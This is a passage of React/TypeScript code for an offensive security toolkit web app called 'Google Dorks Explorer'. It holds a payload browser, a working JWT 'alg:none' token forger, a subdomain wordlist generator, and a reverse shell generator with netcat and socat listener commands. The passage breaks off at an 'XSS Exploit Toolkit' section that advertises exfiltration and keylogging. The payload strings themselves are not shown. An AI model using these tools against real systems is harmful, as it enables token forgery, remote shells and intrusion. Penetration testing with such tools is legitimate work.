  // ── JWT Builder ────────────────────────────────────────────────────────────
  const b64url = (str: string) =>
    btoa(unescape(encodeURIComponent(str))).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_")

  const buildJWT = async () => {
    try {
      const header = jwtAlg === "none"
        ? JSON.stringify({ alg: "none", typ: "JWT" })
        : JSON.stringify({ alg: "HS256", typ: "JWT" })
      const h = b64url(jwtHeader.trim() || header)
      const p = b64url(jwtPayload.trim())
      if (jwtAlg === "none") {
        setJwtOutput(`${h}.${p}.`)
        return
      }
      const enc = new TextEncoder()
      const key = await crypto.subtle.importKey("raw", enc.encode(jwtSecret || "secret"), { name: "HMAC", hash: "SHA-256" }, false, ["sign"])
      const sig = await crypto.subtle.sign("HMAC", key, enc.encode(`${h}.${p}`))
      const sigB64 = btoa(String.fromCharCode(...new Uint8Array(sig))).replace(/=/g, "").replace(/\+/g, "-").replace(/\//g, "_")
      setJwtOutput(`${h}.${p}.${sigB64}`)
    } catch {
      setJwtOutput("⚠ Error: verifica que el header y payload sean JSON válido")
    }
  }

  const copyJWT = async () => {
    await navigator.clipboard.writeText(jwtOutput)
    setJwtCopied(true)
    setTimeout(() => setJwtCopied(false), 2000)
  }

  // ── Subdomain Wordlist ─────────────────────────────────────────────────────
  const subdomainWords = [
    "www","mail","remote","blog","webmail","server","ns1","ns2","smtp","secure",
    "vpn","m","shop","ftp","mail2","test","portal","ns","ww1","host","support",
    "dev","web","bbs","mx","email","mobile","static","docs","beta","git",
    "staging","api","app","admin","panel","cpanel","whm","v2","oauth","sso",
    "cdn","media","images","assets","status","monitor","dashboard","internal",
    "intranet","corp","office","crm","erp","jira","confluence","gitlab",
    "jenkins","sonar","nexus","grafana","kibana","elastic","prometheus",
    "redis","mongo","mysql","postgres","mssql","backup","stage","uat","qa",
    "sandbox","demo","preview","old","legacy","v1","v3","ws","socket","push",
    "notify","jobs","careers","help","kb","wiki","forum","community","store",
    "checkout","pay","payment","invoice","billing","account","profile","auth",
    "login","signup","register","api2","api3","graphql","gateway","proxy",
    "load","lb","ha","prod","production","test2","dev2","stg","int","preprod",
    "prd","local","uat2","release","rc","canary","alpha","next","new","old2",
    "legacy2","archive","data","analytics","reporting","metrics","logs","audit",
  ]

  const generateSubdomains = () => {
    const d = (subDomain || domain).trim().replace(/^https?:\/\//, "").replace(/\/.*/, "")
    if (!d) { setSubList(["⚠ Ingresa un dominio"]); return }
    setSubList(subdomainWords.map(s => `${s}.${d}`))
  }

  const copySubList = async () => {
    await navigator.clipboard.writeText(subList.join("\n"))
    setSubCopied(true)
    setTimeout(() => setSubCopied(false), 2000)
  }

  const exportSubList = () => {
    const blob = new Blob([subList.join("\n")], { type: "text/plain" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `subdomains-${(subDomain || domain || "target").replace(/\W+/g,"-")}.txt`
    a.click()
    URL.revokeObjectURL(url)
  }

  const copyShell = async () => {
    await navigator.clipboard.writeText(currentShell)
    setRsCopied(true)
    setTimeout(() => setRsCopied(false), 2000)
  }

  // ── Export payload category as .txt ───────────────────────────────────────
  const exportPayloads = (category: { title: string; payloads: string[] }) => {
    const blob = new Blob([category.payloads.join("\n")], { type: "text/plain" })
    const url = URL.createObjectURL(blob)
    const a = document.createElement("a")
    a.href = url
    a.download = `${category.title.toLowerCase().replace(/[^a-z0-9]+/g, "-")}.txt`
    a.click()
    URL.revokeObjectURL(url)
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-slate-900 via-purple-900 to-slate-900">
      {/* Animated background elements */}
      <div className="absolute inset-0 overflow-hidden">
        <div className="absolute -top-40 -right-40 w-80 h-80 bg-purple-500/20 rounded-full blur-3xl animate-pulse"></div>
        <div className="absolute -bottom-40 -left-40 w-80 h-80 bg-blue-500/20 rounded-full blur-3xl animate-pulse delay-1000"></div>
        <div className="absolute top-1/2 left-1/2 transform -translate-x-1/2 -translate-y-1/2 w-96 h-96 bg-cyan-500/10 rounded-full blur-3xl animate-pulse delay-500"></div>
      </div>

      <div className="relative z-10 max-w-7xl mx-auto px-4 py-16">
        {/* Hero Section */}
        <div className="text-center mb-20">
          <div className="inline-flex items-center gap-3 px-6 py-3 bg-white/10 backdrop-blur-md border border-white/20 rounded-full mb-8 shadow-lg">
            <Sparkles className="h-5 w-5 text-cyan-400 animate-spin" />
            <span className="text-sm font-semibold text-white">Advanced Security Research Tool</span>
            <div className="w-2 h-2 bg-green-400 rounded-full animate-pulse"></div>
          </div>

          <h1 className="text-6xl md:text-8xl font-black bg-gradient-to-r from-cyan-400 via-purple-400 to-pink-400 bg-clip-text text-transparent mb-6 leading-tight">
            Google Dorks
            <br />
            <span className="text-4xl md:text-6xl">Explorer</span>
          </h1>

          <p className="text-xl text-gray-300 mb-12 max-w-3xl mx-auto leading-relaxed">
            Discover vulnerabilities, exposed data, and security misconfigurations with 
            <span className="text-cyan-400 font-semibold"> advanced search queries</span> and 
            <span className="text-purple-400 font-semibold"> automated reconnaissance</span>
          </p>

          {/* Author credits */}
          <div className="flex items-center justify-center gap-6 mb-12">
            <div className="flex items-center gap-3 text-gray-400">
              <span>Created by</span>
              <a 
                href="https://github.com/xFraylin" 
                target="_blank" 
                rel="noopener noreferrer"
                className="flex items-center gap-2 px-4 py-2 bg-white/10 hover:bg-white/20 border border-white/20 rounded-lg transition-all hover:scale-105"
              >
                <Github className="h-4 w-4" />
                <span className="font-semibold text-white">xFraylin</span>
              </a>
              <a 
                href="https://linkedin.com/in/xfraylin" 
                target="_blank" 
                rel="noopener noreferrer"
                className="flex items-center gap-2 px-4 py-2 bg-white/10 hover:bg-white/20 border border-white/20 rounded-lg transition-all hover:scale-105"
              >
                <Linkedin className="h-4 w-4" />
                <span className="font-semibold text-white">xFraylin</span>
              </a>
            </div>
            <div className="w-px h-6 bg-gray-600"></div>
            <div className="flex items-center gap-3 text-gray-400">
              <span>Credits to</span>
              <a 
                href="https://www.exploit-db.com/" 
                target="_blank" 
                rel="noopener noreferrer"
                className="px-4 py-2 bg-white/10 hover:bg-white/20 border border-white/20 rounded-lg transition-all hover:scale-105 font-semibold text-white"
              >
                ExploitDB
              </a>
            </div>
          </div>

          {/* Tab selector */}
          <div className="flex justify-center mb-10">
            <div className="inline-flex bg-white/10 backdrop-blur-md border border-white/20 rounded-2xl p-1 gap-1">
              <button
                onClick={() => setActiveTab("dorks")}
                className={`flex items-center gap-2 px-6 py-3 rounded-xl font-semibold text-sm transition-all ${
                  activeTab === "dorks"
                    ? "bg-gradient-to-r from-cyan-500 to-purple-500 text-white shadow-lg"
                    : "text-gray-400 hover:text-white"
                }`}
              >
                <Search className="h-4 w-4" />
                Google Dorks
              </button>
              <button
                onClick={() => setActiveTab("payloads")}
                className={`flex items-center gap-2 px-6 py-3 rounded-xl font-semibold text-sm transition-all ${
                  activeTab === "payloads"
                    ? "bg-gradient-to-r from-pink-500 to-orange-500 text-white shadow-lg"
                    : "text-gray-400 hover:text-white"
                }`}
              >
                <Bug className="h-4 w-4" />
                Payloads
              </button>
              <button
                onClick={() => setActiveTab("tools")}
                className={`flex items-center gap-2 px-6 py-3 rounded-xl font-semibold text-sm transition-all ${
                  activeTab === "tools"
                    ? "bg-gradient-to-r from-emerald-500 to-teal-500 text-white shadow-lg"
                    : "text-gray-400 hover:text-white"
                }`}
              >
                <Wrench className="h-4 w-4" />
                Tools
              </button>
            </div>
          </div>

          {/* Domain input + filtros — solo visible en dorks */}
          {activeTab === "dorks" && (
            <div className="max-w-3xl mx-auto mb-10">
              <div className="relative group mb-6">
                <div className="absolute inset-0 bg-gradient-to-r from-cyan-500/20 to-purple-500/20 rounded-2xl blur-lg group-hover:blur-xl transition-all"></div>
                <div className="relative">
                  <Search className="absolute left-6 top-1/2 -translate-y-1/2 h-6 w-6 text-gray-400" />
                  <Input
                    type="text"
                    placeholder="example.com, target.com, *.domain.com"
                    value={domain}
                    onChange={(e) => setDomain(e.target.value)}
                    className="w-full pl-14 pr-6 py-6 text-lg bg-white/10 backdrop-blur-md border border-white/20 rounded-2xl text-white placeholder-gray-400 focus:border-cyan-400 focus:ring-2 focus:ring-cyan-400/20 transition-all shadow-2xl"
                  />
                  <Button
                    onClick={openAllDorks}
                    className="absolute right-3 top-1/2 -translate-y-1/2 bg-gradient-to-r from-purple-500 to-cyan-500 hover:from-purple-600 hover:to-cyan-600 text-white font-semibold px-4 py-2 rounded-lg shadow-lg hover:shadow-xl transition-all hover:scale-105"
                  >
                    <Zap className="h-4 w-4 mr-2" />
                    Open All Dorks
                  </Button>
                </div>
              </div>
              <p className="text-gray-400 mb-6 text-sm text-center">
                Enter single or multiple domains separated by commas • Supports wildcards and subdomains
              </p>
              {/* Filtros de categoría */}
              <div className="flex flex-wrap justify-center gap-2 mb-4">
                {dorkGroups.map((g) => {
                  const count = g === "all"
                    ? dorkCategories.length
                    : dorkCategories.filter((c) => c.group === g).length
                  return (
                    <button
                      key={g}
                      onClick={() => setDorkFilter(g)}
                      className={`flex items-center gap-1.5 px-4 py-1.5 rounded-full text-xs font-semibold border transition-all ${
                        dorkFilter === g
                          ? "bg-gradient-to-r from-cyan-500 to-purple-500 text-white border-transparent shadow"
                          : "bg-white/5 text-gray-400 border-white/10 hover:text-white hover:border-white/20"
                      }`}
                    >
                      {g === "all" ? "All" : g}
                      <span className={`text-[10px] px-1.5 py-0.5 rounded-full ${dorkFilter === g ? "bg-white/20" : "bg-white/10"}`}>
                        {count}
                      </span>
                    </button>
                  )
                })}
              </div>
              {/* Búsqueda */}
              <div className="relative">
                <Search className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-500" />
                <input
                  type="text"
                  placeholder="Buscar en dorks..."
                  value={dorkSearch}
                  onChange={(e) => setDorkSearch(e.target.value)}
                  className="w-full pl-11 pr-4 py-3 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder-gray-500 focus:outline-none focus:border-cyan-400/50 focus:bg-white/10 transition-all"
                />
              </div>
            </div>
          )}

          {/* Payload filter — solo visible en payloads */}
          {activeTab === "payloads" && (
            <div className="max-w-3xl mx-auto mb-12 space-y-4">
              <div className="flex flex-wrap justify-center gap-2">
                {["all", "SQL Injection", "NoSQL Injection", "XSS", "RCE", "SSTI", "LFI / Traversal", "XXE", "SSRF", "Open Redirect", "CRLF", "HTTP Smuggling", "Log4Shell", "GraphQL", "Prototype Pollution", "Host Header", "JWT", "File Upload", "Deserialization", "CORS", "OAuth", "WebSocket", "Race Condition", "LDAP Injection", "XPath Injection", "Email Injection", "HPP", "Cache Poisoning", "SQL Truncation"].map((f) => (
                  <button
                    key={f}
                    onClick={() => setPayloadFilter(f)}
                    className={`px-4 py-1.5 rounded-full text-xs font-semibold border transition-all ${
                      payloadFilter === f
                        ? "bg-gradient-to-r from-pink-500 to-orange-500 text-white border-transparent shadow"
                        : "bg-white/5 text-gray-400 border-white/10 hover:text-white hover:border-white/20"
                    }`}
                  >
                    {f === "all" ? "All" : f}
                  </button>
                ))}
              </div>
              {/* Búsqueda */}
              <div className="relative">
                <Search className="absolute left-4 top-1/2 -translate-y-1/2 h-4 w-4 text-gray-500" />
                <input
                  type="text"
                  placeholder="Buscar payload..."
                  value={payloadSearch}
                  onChange={(e) => setPayloadSearch(e.target.value)}
                  className="w-full pl-11 pr-4 py-3 bg-white/5 border border-white/10 rounded-xl text-sm text-white placeholder-gray-500 focus:outline-none focus:border-pink-400/50 focus:bg-white/10 transition-all"
                />
              </div>
            </div>
          )}
        </div>

        {/* Grid Google Dorks */}
        {activeTab === "dorks" && (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 items-start">
            {dorkCategories
              .filter((c) => dorkFilter === "all" || c.group === dorkFilter)
              .filter((c) => {
                if (!dorkSearch.trim()) return true
                const q = dorkSearch.toLowerCase()
                return c.title.toLowerCase().includes(q) || c.description.toLowerCase().includes(q) || c.dorks.some(d => d.toLowerCase().includes(q))
              })
              .map((category, categoryIndex) => (
              <Card
                key={categoryIndex}
                className="group bg-white/5 backdrop-blur-md border border-white/10 hover:border-white/20 transition-all duration-300 hover:shadow-2xl hover:shadow-purple-500/10"
              >
                <CardHeader className="pb-4">
                  <div className="flex items-center justify-between mb-3">
                    <div className={`inline-flex items-center gap-2 px-3 py-1.5 rounded-lg ${category.color} border`}>
                      {category.icon}
                      <span className="text-xs font-semibold">{category.group}</span>
                    </div>
                    <Badge variant="secondary" className="bg-white/10 text-white border-white/20">
                      {category.dorks.length}
                    </Badge>
                  </div>
                  <CardTitle className="text-white text-lg font-bold mb-2">
                    {category.title}
                  </CardTitle>
                  <p className="text-gray-400 text-sm leading-relaxed">
                    {category.description}
                  </p>
                </CardHeader>

                <CardContent className="space-y-3">
                  <div className="space-y-2">
                    {category.dorks.map((dork, dorkIndex) => {
                      const processedDork = replaceDomain(dork, domain)
                      const uniqueKey = `${categoryIndex}-${dorkIndex}`
                      const isCopied = copiedIndex === uniqueKey

                      return (
                        <div key={dorkIndex} className="group/dork relative">
                          <a
                            href={generateGoogleSearchUrl(processedDork)}
                            target="_blank"
                            rel="noopener noreferrer"
                            className="block p-3 bg-white/5 hover:bg-white/10 border border-white/10 hover:border-white/20 rounded-lg text-sm font-mono text-gray-300 hover:text-white transition-colors break-all"
                          >
                            {processedDork}
                          </a>
                          <Button
                            size="icon"
                            variant="ghost"
                            className="absolute top-2 right-2 h-8 w-8 opacity-0 group-hover/dork:opacity-100 transition-all hover:bg-white/20 rounded-lg"
                            onClick={() => copyToClipboard(processedDork, uniqueKey)}
                          >
                            {isCopied ? (
                              <Check className="h-4 w-4 text-green-400" />
                            ) : (
                              <Copy className="h-4 w-4 text-gray-400" />
                            )}
                          </Button>
                        </div>
                      )
                    })}
                  </div>
                </CardContent>
              </Card>
            ))}
          </div>
        )}

        {/* Grid Payloads */}
        {activeTab === "payloads" && (
          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-8 items-start">
            {allPayloadCategories
              .filter((cat) => payloadFilter === "all" || cat.tag === payloadFilter)
              .filter((cat) => {
                if (!payloadSearch.trim()) return true
                const q = payloadSearch.toLowerCase()
                return cat.title.toLowerCase().includes(q) || cat.tag.toLowerCase().includes(q) || cat.payloads.some(p => p.toLowerCase().includes(q))
              })
              .map((category: PayloadCategory, categoryIndex: number) => {
                const copyAllKey = `payloads-all-${categoryIndex}`
                const isCopyAllDone = copiedIndex === copyAllKey
                return (
                  <Card
                    key={categoryIndex}
                    className="group bg-white/5 backdrop-blur-md border border-white/10 hover:border-white/20 transition-all duration-300 hover:shadow-2xl hover:shadow-pink-500/10"
                  >
                    <CardHeader className="pb-4">
                      <div className="flex items-center justify-between mb-3">
                        <div className={`inline-flex items-center gap-2 px-3 py-1.5 rounded-lg ${category.tagColor} border`}>
                          <Bug className="h-3 w-3" />
                          <span className="text-xs font-semibold">{category.tag}</span>
                        </div>
                        <div className="flex items-center gap-1.5">
                          <Badge variant="secondary" className="bg-white/10 text-white border-white/20">
                            {category.payloads.length}
                          </Badge>
                          <Button
                            size="icon"
                            variant="ghost"
                            title="Copy all"
                            className="h-7 w-7 hover:bg-white/20 rounded-lg"
                            onClick={() => copyToClipboard(category.payloads.join("\n"), copyAllKey)}
                          >
                            {isCopyAllDone ? (
                              <Check className="h-3.5 w-3.5 text-green-400" />
                            ) : (
                              <Copy className="h-3.5 w-3.5 text-gray-400" />
                            )}
                          </Button>
                          <Button
                            size="icon"
                            variant="ghost"
                            title="Export .txt"
                            className="h-7 w-7 hover:bg-white/20 rounded-lg"
                            onClick={() => exportPayloads(category)}
                          >
                            <Download className="h-3.5 w-3.5 text-gray-400" />
                          </Button>
                        </div>
                      </div>
                      <CardTitle className="text-white text-lg font-bold mb-2">
                        {category.title}
                      </CardTitle>
                      <p className="text-gray-400 text-sm leading-relaxed">
                        {category.description}
                      </p>
                    </CardHeader>

                    <CardContent className="space-y-3">
                      <div className="space-y-2">
                        {category.payloads.map((payload: string, payloadIndex: number) => {
                          const uniqueKey = `payload-${categoryIndex}-${payloadIndex}`
                          const isCopied = copiedIndex === uniqueKey
                          return (
                            <div key={payloadIndex} className="group/payload relative">
                              <pre className="block p-3 bg-white/5 border border-white/10 rounded-lg text-xs font-mono text-gray-300 break-all whitespace-pre-wrap leading-relaxed pr-10">
                                {payload}
                              </pre>
                              <Button
                                size="icon"
                                variant="ghost"
                                className="absolute top-2 right-2 h-7 w-7 opacity-0 group-hover/payload:opacity-100 transition-all hover:bg-white/20 rounded-lg"
                                onClick={() => copyToClipboard(payload, uniqueKey)}
                              >
                                {isCopied ? (
                                  <Check className="h-3.5 w-3.5 text-green-400" />
                                ) : (
                                  <Copy className="h-3.5 w-3.5 text-gray-400" />
                                )}
                              </Button>
                            </div>
                          )
                        })}
                      </div>
                    </CardContent>
                  </Card>
                )
              })}
          </div>
        )}

        {/* ── Tools Tab ── */}
        {activeTab === "tools" && (
          <div className="space-y-10 max-w-4xl mx-auto">

            {/* Encoder / Decoder */}
            <Card className="bg-white/5 backdrop-blur-md border border-white/10">
              <CardHeader className="pb-4">
                <div className="flex items-center gap-3 mb-1">
                  <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-emerald-500/10 text-emerald-400 border border-emerald-500/20">
                    <Code className="h-4 w-4" />
                    <span className="text-xs font-semibold">Encoder / Decoder</span>
                  </div>
                </div>
                <CardTitle className="text-white text-xl font-bold">Encoder / Decoder</CardTitle>
                <p className="text-gray-400 text-sm">URL · Base64 · HTML Entities · Hex · Unicode · JS Escape</p>
              </CardHeader>
              <CardContent className="space-y-4">
                <textarea
                  rows={4}
                  placeholder="Pega aquí el texto a codificar / decodificar..."
                  value={encInput}
                  onChange={(e) => setEncInput(e.target.value)}
                  className="w-full p-4 bg-black/30 border border-white/10 rounded-xl text-sm font-mono text-white placeholder-gray-600 focus:outline-none focus:border-emerald-400/50 resize-none"
                />
                <div className="flex flex-wrap gap-2">
                  {[
                    { id: "url-enc",    label: "URL Encode" },
                    { id: "url-dec",    label: "URL Decode" },
                    { id: "url-double", label: "Double URL Encode" },
                    { id: "b64-enc",    label: "Base64 Encode" },
                    { id: "b64-dec",    label: "Base64 Decode" },
                    { id: "html-enc",   label: "HTML Encode" },
                    { id: "html-dec",   label: "HTML Decode" },
                    { id: "hex-enc",    label: "Hex Encode" },
                    { id: "hex-dec",    label: "Hex Decode" },
                    { id: "unicode",    label: "Unicode Escape" },
                    { id: "js-escape",  label: "JS \\x Escape" },
                  ].map(({ id, label }) => (
                    <button
                      key={id}
                      onClick={() => runEncode(id)}
                      className="px-3 py-1.5 text-xs font-semibold rounded-lg bg-white/5 hover:bg-emerald-500/20 border border-white/10 hover:border-emerald-500/30 text-gray-300 hover:text-emerald-300 transition-all"
                    >
                      {label}
                    </button>
                  ))}
                </div>
                {encOutput && (
                  <div className="relative">
                    <pre className="p-4 bg-black/40 border border-white/10 rounded-xl text-sm font-mono text-emerald-300 break-all whitespace-pre-wrap max-h-48 overflow-y-auto pr-12">
                      {encOutput}
                    </pre>
                    <Button
                      size="icon"
                      variant="ghost"
                      className="absolute top-3 right-3 h-8 w-8 hover:bg-white/20 rounded-lg"
                      onClick={copyEncOutput}
                    >
                      {encCopied ? <Check className="h-4 w-4 text-green-400" /> : <Copy className="h-4 w-4 text-gray-400" />}
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>

            {/* Reverse Shell Generator */}
            <Card className="bg-white/5 backdrop-blur-md border border-white/10">
              <CardHeader className="pb-4">
                <div className="flex items-center gap-3 mb-1">
                  <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-red-500/10 text-red-400 border border-red-500/20">
                    <Terminal className="h-4 w-4" />
                    <span className="text-xs font-semibold">Reverse Shell Generator</span>
                  </div>
                </div>
                <CardTitle className="text-white text-xl font-bold">Reverse Shell Generator</CardTitle>
                <p className="text-gray-400 text-sm">Configura LHOST, LPORT y tipo de shell. Copia y pega en el target.</p>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
                  <div>
                    <label className="block text-xs font-semibold text-gray-400 mb-2">LHOST (tu IP)</label>
                    <input
                      type="text"
                      placeholder="10.10.10.1"
                      value={rsIP}
                      onChange={(e) => setRsIP(e.target.value)}
                      className="w-full px-4 py-3 bg-black/30 border border-white/10 rounded-xl text-sm font-mono text-white placeholder-gray-600 focus:outline-none focus:border-red-400/50"
                    />
                  </div>
                  <div>
                    <label className="block text-xs font-semibold text-gray-400 mb-2">LPORT</label>
                    <input
                      type="text"
                      placeholder="4444"
                      value={rsPort}
                      onChange={(e) => setRsPort(e.target.value)}
                      className="w-full px-4 py-3 bg-black/30 border border-white/10 rounded-xl text-sm font-mono text-white placeholder-gray-600 focus:outline-none focus:border-red-400/50"
                    />
                  </div>
                </div>
                <div>
                  <label className="block text-xs font-semibold text-gray-400 mb-2">Tipo de shell</label>
                  <div className="flex flex-wrap gap-2">
                    {Object.entries(reverseShells).map(([key, { label }]) => (
                      <button
                        key={key}
                        onClick={() => setRsType(key)}
                        className={`px-3 py-1.5 text-xs font-semibold rounded-lg border transition-all ${
                          rsType === key
                            ? "bg-red-500/20 border-red-500/40 text-red-300"
                            : "bg-white/5 border-white/10 text-gray-400 hover:text-white hover:border-white/20"
                        }`}
                      >
                        {label}
                      </button>
                    ))}
                  </div>
                </div>
                <div className="relative">
                  <pre className="p-4 bg-black/40 border border-white/10 rounded-xl text-sm font-mono text-red-300 break-all whitespace-pre-wrap pr-12">
                    {currentShell}
                  </pre>
                  <Button
                    size="icon"
                    variant="ghost"
                    className="absolute top-3 right-3 h-8 w-8 hover:bg-white/20 rounded-lg"
                    onClick={copyShell}
                  >
                    {rsCopied ? <Check className="h-4 w-4 text-green-400" /> : <Copy className="h-4 w-4 text-gray-400" />}
                  </Button>
                </div>
                <p className="text-xs text-gray-600">
                  Listener: <span className="font-mono text-gray-400">nc -lvnp {rsPort || "LPORT"}</span>
                  {rsType.startsWith("socat") && <span className="ml-3 font-mono text-gray-400">socat file:`tty`,raw,echo=0 tcp-listen:{rsPort || "LPORT"}</span>}
                </p>
              </CardContent>
            </Card>

            {/* Hash Identifier */}
            <Card className="bg-white/5 backdrop-blur-md border border-white/10">
              <CardHeader className="pb-4">
                <div className="flex items-center gap-3 mb-1">
                  <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-blue-500/10 text-blue-400 border border-blue-500/20">
                    <Hash className="h-4 w-4" />
                    <span className="text-xs font-semibold">Hash Identifier</span>
                  </div>
                </div>
                <CardTitle className="text-white text-xl font-bold">Hash Identifier</CardTitle>
                <p className="text-gray-400 text-sm">Identifica el tipo de hash: MD5, SHA-1/256/512, bcrypt, NTLM, JWT y más</p>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex gap-2">
                  <input
                    type="text"
                    placeholder="Pega el hash aquí..."
                    value={hashInput}
                    onChange={(e) => { setHashInput(e.target.value); setHashResults(identifyHash(e.target.value)) }}
                    className="flex-1 px-4 py-3 bg-black/30 border border-white/10 rounded-xl text-sm font-mono text-white placeholder-gray-600 focus:outline-none focus:border-blue-400/50"
                  />
                </div>
                {hashResults.length > 0 && (
                  <div className="space-y-1.5">
                    {hashResults.map((r, i) => (
                      <div key={i} className="flex items-center gap-2 px-3 py-2 bg-blue-500/10 border border-blue-500/20 rounded-lg">
                        <Hash className="h-3.5 w-3.5 text-blue-400 flex-shrink-0" />
                        <span className="text-sm text-blue-300 font-mono">{r}</span>
                      </div>
                    ))}
                  </div>
                )}
              </CardContent>
            </Card>

            {/* JWT Builder */}
            <Card className="bg-white/5 backdrop-blur-md border border-white/10">
              <CardHeader className="pb-4">
                <div className="flex items-center gap-3 mb-1">
                  <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-violet-500/10 text-violet-400 border border-violet-500/20">
                    <Key className="h-4 w-4" />
                    <span className="text-xs font-semibold">JWT Builder</span>
                  </div>
                </div>
                <CardTitle className="text-white text-xl font-bold">JWT Builder</CardTitle>
                <p className="text-gray-400 text-sm">Construye tokens JWT custom: alg:none para bypass o HS256 con secreto</p>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex gap-2">
                  {["none", "HS256"].map((alg) => (
                    <button
                      key={alg}
                      onClick={() => {
                        setJwtAlg(alg)
                        setJwtHeader(alg === "none" ? '{"alg":"none","typ":"JWT"}' : '{"alg":"HS256","typ":"JWT"}')
                      }}
                      className={`px-4 py-2 text-xs font-semibold rounded-lg border transition-all ${
                        jwtAlg === alg
                          ? "bg-violet-500/20 border-violet-500/40 text-violet-300"
                          : "bg-white/5 border-white/10 text-gray-400 hover:text-white"
                      }`}
                    >
                      alg: {alg}
                    </button>
                  ))}
                </div>
                <div>
                  <label className="block text-xs font-semibold text-gray-400 mb-1.5">Header (JSON)</label>
                  <textarea rows={2} value={jwtHeader} onChange={(e) => setJwtHeader(e.target.value)}
                    className="w-full p-3 bg-black/30 border border-white/10 rounded-xl text-xs font-mono text-white focus:outline-none focus:border-violet-400/50 resize-none" />
                </div>
                <div>
                  <label className="block text-xs font-semibold text-gray-400 mb-1.5">Payload (JSON)</label>
                  <textarea rows={3} value={jwtPayload} onChange={(e) => setJwtPayload(e.target.value)}
                    className="w-full p-3 bg-black/30 border border-white/10 rounded-xl text-xs font-mono text-white focus:outline-none focus:border-violet-400/50 resize-none" />
                </div>
                {jwtAlg === "HS256" && (
                  <div>
                    <label className="block text-xs font-semibold text-gray-400 mb-1.5">Secret</label>
                    <input type="text" placeholder="secretkey" value={jwtSecret} onChange={(e) => setJwtSecret(e.target.value)}
                      className="w-full px-4 py-3 bg-black/30 border border-white/10 rounded-xl text-sm font-mono text-white placeholder-gray-600 focus:outline-none focus:border-violet-400/50" />
                  </div>
                )}
                <button onClick={buildJWT}
                  className="w-full py-3 bg-gradient-to-r from-violet-500 to-purple-600 hover:from-violet-600 hover:to-purple-700 text-white font-semibold rounded-xl transition-all text-sm">
                  Generar JWT
                </button>
                {jwtOutput && (
                  <div className="relative">
                    <pre className="p-4 bg-black/40 border border-white/10 rounded-xl text-xs font-mono text-violet-300 break-all whitespace-pre-wrap pr-12 max-h-40 overflow-y-auto">
                      {jwtOutput}
                    </pre>
                    <Button size="icon" variant="ghost" className="absolute top-3 right-3 h-8 w-8 hover:bg-white/20 rounded-lg" onClick={copyJWT}>
                      {jwtCopied ? <Check className="h-4 w-4 text-green-400" /> : <Copy className="h-4 w-4 text-gray-400" />}
                    </Button>
                  </div>
                )}
              </CardContent>
            </Card>

            {/* Subdomain Wordlist Generator */}
            <Card className="bg-white/5 backdrop-blur-md border border-white/10">
              <CardHeader className="pb-4">
                <div className="flex items-center gap-3 mb-1">
                  <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">
                    <List className="h-4 w-4" />
                    <span className="text-xs font-semibold">Subdomain Wordlist</span>
                  </div>
                </div>
                <CardTitle className="text-white text-xl font-bold">Subdomain Wordlist Generator</CardTitle>
                <p className="text-gray-400 text-sm">Genera una wordlist de subdominios comunes para usar con ffuf, gobuster o amass</p>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex gap-2">
                  <input
                    type="text"
                    placeholder={domain || "target.com"}
                    value={subDomain}
                    onChange={(e) => setSubDomain(e.target.value)}
                    className="flex-1 px-4 py-3 bg-black/30 border border-white/10 rounded-xl text-sm font-mono text-white placeholder-gray-600 focus:outline-none focus:border-cyan-400/50"
                  />
                  <button onClick={generateSubdomains}
                    className="px-5 py-3 bg-gradient-to-r from-cyan-500 to-teal-500 hover:from-cyan-600 hover:to-teal-600 text-white font-semibold rounded-xl transition-all text-sm whitespace-nowrap">
                    Generar
                  </button>
                </div>
                {subList.length > 0 && (
                  <>
                    <div className="flex gap-2">
                      <button onClick={copySubList}
                        className="flex items-center gap-2 px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-xs text-gray-300 hover:text-white transition-all">
                        {subCopied ? <Check className="h-3.5 w-3.5 text-green-400" /> : <Copy className="h-3.5 w-3.5" />}
                        Copiar todo
                      </button>
                      <button onClick={exportSubList}
                        className="flex items-center gap-2 px-4 py-2 bg-white/5 hover:bg-white/10 border border-white/10 rounded-lg text-xs text-gray-300 hover:text-white transition-all">
                        <Download className="h-3.5 w-3.5" />
                        Export .txt
                      </button>
                      <span className="ml-auto text-xs text-gray-500 self-center">{subList.length} subdominios</span>
                    </div>
                    <pre className="p-4 bg-black/40 border border-white/10 rounded-xl text-xs font-mono text-cyan-300 max-h-56 overflow-y-auto">
                      {subList.join("\n")}
                    </pre>
                    <p className="text-xs text-gray-600">
                      Uso: <span className="font-mono text-gray-400">ffuf -u https://FUZZ.{subDomain || domain || "target.com"} -w subdomains.txt</span>
                    </p>
                  </>
                )}
              </CardContent>
            </Card>

            {/* XSS Exploit Toolkit */}
            <Card className="bg-white/5 backdrop-blur-md border border-white/10">
              <CardHeader className="pb-4">
                <div className="flex items-center gap-3 mb-1">
                  <div className="inline-flex items-center gap-2 px-3 py-1.5 rounded-lg bg-red-500/10 text-red-400 border border-red-500/20">
                    <Zap className="h-4 w-4" />
                    <span className="text-xs font-semibold">XSS Exploit</span>
                  </div>
                </div>
                <CardTitle className="text-white text-xl font-bold">XSS Exploit Toolkit</CardTitle>
                <p className="text-gray-400 text-sm">Payloads de explotación real organizados por técnica: defacement, exfiltración, keylogging, persistencia y más</p>
              </CardHeader>
              <CardContent className="space-y-4">
                <div className="flex flex-wrap gap-2">
                  {xssExploitSections.map(section => (
                    <button
                      key={section.id}
                      onClick={() => setXssSection(section.id)}
                      className={`px-3 py-1.5 rounded-lg text-xs font-semibold border transition-all ${
                        xssSection === section.id
